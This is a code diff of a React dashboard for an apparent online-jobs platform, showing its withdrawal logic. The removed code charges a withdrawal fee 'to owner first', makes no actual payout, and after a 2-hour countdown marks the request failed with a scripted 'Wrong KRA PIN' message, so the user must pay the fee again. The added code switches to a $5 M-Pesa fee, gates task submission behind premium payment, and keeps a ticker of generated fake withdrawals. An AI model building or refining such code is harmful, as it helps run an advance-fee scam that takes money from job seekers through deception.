-      : 'Wrong KRA PIN entered. The KRA PIN you submitted does not match the account holder details.'
-  );
-
-  return (
-    <div className="modal-overlay" onClick={onClose}>
-      <div className="pay-modal-card" style={{ maxWidth: 440 }} onClick={e => e.stopPropagation()}>
-        <div className="pay-modal-header" style={{ background: 'linear-gradient(135deg, #DC2626, #B91C1C)' }}>
-          <div>
-            <div className="pay-modal-title">❌ Withdrawal Failed</div>
-            <div style={{ fontSize: 12, color: 'rgba(255,255,255,0.7)', marginTop: 2 }}>Verification unsuccessful</div>
-          </div>
-          <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
-        </div>
-
-        <div className="pay-modal-body" style={{ padding: '28px 28px 24px' }}>
-          {/* Error banner */}
-          <div style={{
-            background: '#FEF2F2',
-            border: '1.5px solid #FECACA',
-            borderRadius: 12,
-            padding: '16px 18px',
-            marginBottom: 22,
-            display: 'flex',
-            gap: 12,
-            alignItems: 'flex-start',
-          }}>
-            <span style={{ fontSize: 24, flexShrink: 0 }}>⚠️</span>
-            <div>
-              <p style={{ margin: '0 0 6px', fontWeight: 700, fontSize: 14, color: '#991B1B' }}>
-                Verification Failed
-              </p>
-              <p style={{ margin: 0, fontSize: 13, color: '#7F1D1D', lineHeight: 1.65 }}>
-                {reason.current}
-              </p>
-            </div>
-          </div>
-
-          {/* Details */}
-          <div style={{ display: 'flex', flexDirection: 'column', gap: 10, marginBottom: 24 }}>
-            <div className="withdraw-detail-card" style={{ background: '#FEF2F2', borderColor: '#FECACA' }}>
-              <div>
-                <div className="withdraw-detail-label">Attempted Amount</div>
-                <div className="withdraw-detail-value amount">KES {(data?.amount || 0).toLocaleString()}</div>
-              </div>
-              <div className="withdraw-detail-icon">💸</div>
-            </div>
-            <div className="withdraw-detail-card" style={{ background: '#FEF2F2', borderColor: '#FECACA' }}>
-              <div>
-                <div className="withdraw-detail-label">Status</div>
-                <div className="withdraw-detail-value" style={{ color: '#DC2626', fontWeight: 700, display: 'flex', alignItems: 'center', gap: 6 }}>
-                  <span style={{ width: 8, height: 8, borderRadius: '50%', background: '#DC2626', display: 'inline-block', flexShrink: 0 }} />
-                  Failed
-                </div>
-              </div>
-              <div className="withdraw-detail-icon">❌</div>
-            </div>
-          </div>
-
-          {/* Actions */}
-          <button
-            className="pay-btn"
-            style={{ background: 'linear-gradient(135deg, #1A7A4A, #059669)', marginBottom: 12 }}
-            onClick={onReset}
-          >
-            🔄 Try Again
-          </button>
-          <button className="withdraw-close-btn" onClick={onClose}>Dismiss</button>
-          <div className="withdraw-footer-note" style={{ color: '#DC2626' }}>
-            Please ensure your KRA PIN and personal details are correct before retrying.
-          </div>
-        </div>
-      </div>
-    </div>
-  );
-}
-
-// ─── Smart Withdraw Controller ────────────────────────────────────────────────
-function WithdrawModal({
-  user,
-  onClose,
-  pendingWithdrawal,
-  onWithdrawalSubmitted,
-  withdrawalFeePaid,
-  onWithdrawalExpired,
-  onWithdrawalReset,
-}) {
-  // Not activated
-  if (!user?.activated) {
-    return (
-      <div className="modal-overlay" onClick={onClose}>
-        <div className="pay-modal-card" style={{ maxWidth: 400 }} onClick={e => e.stopPropagation()}>
-          <div className="pay-modal-header" style={{ background: 'var(--black)' }}>
-            <div className="pay-modal-title">Withdrawal</div>
-            <button className="modal-close" onClick={onClose} style={{ background: 'rgba(255,255,255,0.15)' }}>×</button>
-          </div>
-          <div className="pay-modal-body" style={{ textAlign: 'center', padding: '36px 28px' }}>
-            <div style={{ fontSize: 52, marginBottom: 16 }}>🔒</div>
-            <h3 style={{ fontSize: 20, fontWeight: 700, marginBottom: 12, color: 'var(--black)' }}>Activation Required</h3>
-            <p style={{ fontSize: 14, color: 'var(--gray)', lineHeight: 1.7, marginBottom: 24 }}>
-              Please <strong>activate your account</strong> first before requesting a withdrawal.
-            </p>
-            <button onClick={onClose} style={{ background: 'none', border: 'none', color: 'var(--gray)', fontSize: 13, cursor: 'pointer' }}>Close</button>
-          </div>
-        </div>
-      </div>
-    );
-  }
-
-  // Failed state — show failure modal
-  if (pendingWithdrawal?.status === 'failed') {
-    return (
-      <WithdrawFailedModal
-        data={pendingWithdrawal}
-        onClose={onClose}
-        onReset={() => { onWithdrawalReset(); onClose(); }}
-      />
-    );
-  }
-
-  // Pending state — show countdown
-  if (pendingWithdrawal?.status === 'pending') {
-    return (
-      <WithdrawPendingModal
-        data={pendingWithdrawal}
-        onClose={onClose}
-        onExpired={onWithdrawalExpired}
-      />
-    );
-  }
-
-  // Fee not yet paid — client must pay KES 480 to owner first
-  if (!withdrawalFeePaid) {
-    return <WithdrawFeeModal user={user} onClose={onClose} />;
-  }
-
-  // Fee paid — show the withdrawal details form (stored to backend, no Paystack payout)
-  return (
-    <WithdrawFormModal
-      user={user}
-      onClose={onClose}
-      onSubmitted={onWithdrawalSubmitted}
-    />
   );
 }
 
@@ -1000,12 +800,11 @@ function LiveWithdrawalsTicker({ withdrawals }) {
 }
 
 // ─── Hamburger Menu ───────────────────────────────────────────────────────────
-function HamburgerMenu({ user, onClose, onUpgrade, onWithdraw, onReferral, onTraining, onLogout, onMpesaWithdraw }) {
+function HamburgerMenu({ user, onClose, onUpgrade, onMpesaWithdraw, onReferral, onTraining, onLogout }) {
   const items = [
     { icon: '🏠', label: 'Dashboard',            action: () => { onClose(); } },
     { icon: '⭐', label: 'Upgrade to Premium',   action: () => { onClose(); onUpgrade(); } },
     { icon: '✅', label: 'Awarded Tasks',         action: () => { onClose(); document.getElementById('tasks-section')?.scrollIntoView({ behavior: 'smooth' }); } },
-    { icon: '💸', label: 'Withdraw Money',        action: () => { onClose(); onWithdraw(); } },
     { icon: '📲', label: 'Withdraw with M-Pesa', action: () => { onClose(); onMpesaWithdraw(); } },
     { icon: '🎓', label: 'Apply for Training',    action: () => { onClose(); onTraining(); } },
     { icon: '🔗', label: 'My Referral Link',      action: () => { onClose(); onReferral(); } },
@@ -1062,15 +861,11 @@ export default function Dashboard() {
   const [selectedTask,        setSelectedTask]        = useState(null);
   const [payTask,             setPayTask]             = useState(null);
   const [showUpgrade,         setShowUpgrade]         = useState(false);
-  const [showWithdraw,        setShowWithdraw]        = useState(false);
+  const [showMpesaWithdraw,   setShowMpesaWithdraw]   = useState(false);
+  const [mpesaInitialStep,    setMpesaInitialStep]    = useState('fee');
   const [showReferral,        setShowReferral]        = useState(false);
   const [showMenu,            setShowMenu]            = useState(false);
   const [showTraining,        setShowTraining]        = useState(false);
-  const [showMpesaComingSoon, setShowMpesaComingSoon] = useState(false);
-
-  // Withdrawal state
-  const [pendingWithdrawal,  setPendingWithdrawal]  = useState(null);
-  const [withdrawalFeePaid,  setWithdrawalFeePaid]  = useState(false);
 
   const [liveWithdrawals, setLiveWithdrawals] = useState([]);
   const [filter, setFilter] = useState('All');
@@ -1081,57 +876,28 @@ export default function Dashboard() {
     'Transcription','Translation','Survey','Testing','Audio','Education','Admin',
   ];
 
-  // ── Polling: check if pending deadline has passed even while modal is closed ─
-  useEffect(() => {
-    if (!user) return;
-
-    const tick = async () => {
-      const req = await getWithdrawalRequest(user.id).catch(() => null);
-      if (!req || req.status !== 'pending') return;
-      if (req.deadline && Date.now() >= req.deadline) {
-        const failed = await updateWithdrawalStatus(req.id, user.id, 'failed').catch(() => null);
-        if (failed) setPendingWithdrawal(failed);
-      }
-    };
-
-    tick();
-    const id = setInterval(tick, 10000);
-    return () => clearInterval(id);
-  }, [user]);
-
   useEffect(() => {
     async function init() {
       setMounted(true);
       const u = await getCurrentUser();
       if (!u) { router.replace('/login'); return; }
       setUser(u);
-
-      const wd = await getWithdrawalRequest(u.id).catch(() => null);
-      if (wd && wd.status !== 'cancelled') setPendingWithdrawal(wd);
-
-      try {
-        const feePaid = localStorage.getItem(`withdrawal_fee_paid_${u.id}`);
-        if (feePaid === 'true') setWithdrawalFeePaid(true);
-      } catch (_) {}
-
       setLiveWithdrawals(getOrGenerateWithdrawals());
     }
     init();
   }, [router]);
 
-  // After Paystack redirects back, detect the withdrawal_fee plan and unlock the form
+  // Detect return from Paystack after paying the $5 USD M-Pesa fee
   useEffect(() => {
     if (!user) return;
     const params    = new URLSearchParams(window.location.search);
     const plan      = params.get('plan');
     const trxref    = params.get('trxref');
     const reference = params.get('reference');
-
-    if (plan === 'withdrawal_fee' && (trxref || reference)) {
-      try { localStorage.setItem(`withdrawal_fee_paid_${user.id}`, 'true'); } catch (_) {}
-      setWithdrawalFeePaid(true);
+    if (plan === 'mpesa_withdrawal_fee' && (trxref || reference)) {
       router.replace('/dashboard', undefined, { shallow: true });
-      setShowWithdraw(true);
+      setMpesaInitialStep('form');
+      setShowMpesaWithdraw(true);
     }
   }, [user, router]);
 
@@ -1156,30 +922,11 @@ export default function Dashboard() {
     if (updated) setUser(updated);
   }, [user]);
 
-  const handleWithdrawalSubmitted = useCallback(request => {
-    setPendingWithdrawal(request);
-    setShowWithdraw(false);
-  }, []);
-
-  // Called when 2-hour countdown hits zero — flip to failed state
-  const handleWithdrawalExpired = useCallback(async () => {
-    if (!user || !pendingWithdrawal?.id) return;
-    const failed = await updateWithdrawalStatus(pendingWithdrawal.id, user.id, 'failed').catch(() => null);
-    if (failed) setPendingWithdrawal(failed);
-  }, [user, pendingWithdrawal]);
-
-  // Reset entire withdrawal cycle so user must pay the fee again to retry
-  const handleWithdrawalReset = useCallback(async () => {
-    if (!user) return;
-    if (pendingWithdrawal?.id) {
-      await updateWithdrawalStatus(pendingWithdrawal.id, user.id, 'cancelled').catch(() => null);
-    }
-    try { localStorage.removeItem(`withdrawal_fee_paid_${user.id}`); } catch (_) {}
-    setPendingWithdrawal(null);
-    setWithdrawalFeePaid(false);
-  }, [user, pendingWithdrawal]);
-
   function handleSubmitTask(task) {
+    if (!user.premium) {
+      setShowUpgrade(true);
+      return;
+    }
     const subject = encodeURIComponent('Task Submission: ' + task.title);
     const body    = encodeURIComponent(
       `Hello Business Hub,\n\nPlease submit your tasks on email for review.\n\nTask: ${task.title}\nCategory: ${task.category}\nPayment: KES ${task.payment.toLocaleString()}\n\nYour submission:\n\n[Add your work here]\n\nSubmitted by: ${user?.fullName || ''}\nEmail: ${user?.email || ''}`
@@ -1205,9 +952,6 @@ export default function Dashboard() {
 
   const initials     = user.fullName?.split(' ').map(n => n[0]).join('').slice(0, 2).toUpperCase() || 'U';
   const referralLink = `https://onlinejob-pi.vercel.app/join?ref=${user.id || 'USER123'}`;
-
-  // Determine pending dot visibility on the Withdraw button
-  const showPendingDot = pendingWithdrawal?.status === 'pending' || pendingWithdrawal?.status === 'failed';
 
   return (
     <div className="dashboard">
@@ -1275,33 +1019,15 @@ export default function Dashboard() {
         <div className="quick-actions">
           <button className="quick-action-card" onClick={() => setShowUpgrade(true)}>
             <span className="quick-action-icon">⭐</span>
-            <span className="quick-action-label">Upgrade Premium</span>
+            <span className="quick-action-label">{user?.premium ? 'Renew Premium' : 'Upgrade Premium'}</span>
           </button>
           <button className="quick-action-card" onClick={() => document.getElementById('tasks-section')?.scrollIntoView({ behavior: 'smooth' })}>
             <span className="quick-action-icon">✅</span>
             <span className="quick-action-label">Awarded Tasks</span>
           </button>
-          <button className="quick-action-card" onClick={() => setShowWithdraw(true)}>
-            <span className="quick-action-icon">💸</span>
-            <span className="quick-action-label">
-              Withdraw Money
-              {showPendingDot && (
-                <span style={{
-                  display: 'inline-block',
-                  marginLeft: 6,
-                  width: 8,
-                  height: 8,
-                  borderRadius: '50%',
-                  background: pendingWithdrawal?.status === 'failed' ? '#DC2626' : '#F59E0B',
-                  verticalAlign: 'middle',
-                }} />
-              )}
-            </span>
-          </button>
-          <button className="quick-action-card quick-action-mpesa" onClick={() => setShowMpesaComingSoon(true)}>
+          <button className="quick-action-card quick-action-mpesa" onClick={() => setShowMpesaWithdraw(true)}>
             <span className="quick-action-icon">📲</span>
             <span className="quick-action-label">Withdraw with M-Pesa</span>
-            <span className="mpesa-coming-soon-pill">Soon</span>
           </button>
           <button className="quick-action-card" onClick={() => setShowTraining(true)}>
             <span className="quick-action-icon">🎓</span>
@@ -1392,7 +1118,7 @@ export default function Dashboard() {
 
       {/* ── Modals ── */}
       {selectedTask && (
-        <TaskModal task={selectedTask} user={user} onClose={() => setSelectedTask(null)} onBidClick={handleBidClick} />
+        <TaskModal task={selectedTask} user={user} onClose={() => setSelectedTask(null)} onBidClick={handleBidClick} onUpgradeClick={() => setShowUpgrade(true)} />
       )}
       {payTask && (
         <PaymentModal task={payTask} user={user} onClose={() => setPayTask(null)} onSuccess={handlePaySuccess} />
@@ -1401,20 +1127,12 @@ export default function Dashboard() {
       {showReferral && <ReferralModal user={user} onClose={() => setShowReferral(false)} />}
       {showTraining && <TrainingModal user={user} onClose={() => setShowTraining(false)} />}
 
-      {showWithdraw && (
-        <WithdrawModal
+      {showMpesaWithdraw && (
+        <MpesaWithdrawModal
           user={user}
-          onClose={() => setShowWithdraw(false)}
-          pendingWithdrawal={pendingWithdrawal}
-          onWithdrawalSubmitted={handleWithdrawalSubmitted}
-          withdrawalFeePaid={withdrawalFeePaid}
-          onWithdrawalExpired={handleWithdrawalExpired}
-          onWithdrawalReset={handleWithdrawalReset}
+          initialStep={mpesaInitialStep}
+          onClose={() => { setShowMpesaWithdraw(false); setMpesaInitialStep('fee'); }}
         />
-      )}
-
-      {showMpesaComingSoon && (
-        <ComingSoonModal onClose={() => setShowMpesaComingSoon(false)} />
       )}
 
       {showMenu && (
@@ -1422,10 +1140,9 @@ export default function Dashboard() {
           user={user}
           onClose={() => setShowMenu(false)}
           onUpgrade={() => setShowUpgrade(true)}
-          onWithdraw={() => setShowWithdraw(true)}
+          onMpesaWithdraw={() => setShowMpesaWithdraw(true)}
           onReferral={() => setShowReferral(true)}
           onTraining={() => setShowTraining(true)}
-          onMpesaWithdraw={() => setShowMpesaComingSoon(true)}
           onLogout={handleLogout}
         />
       )}
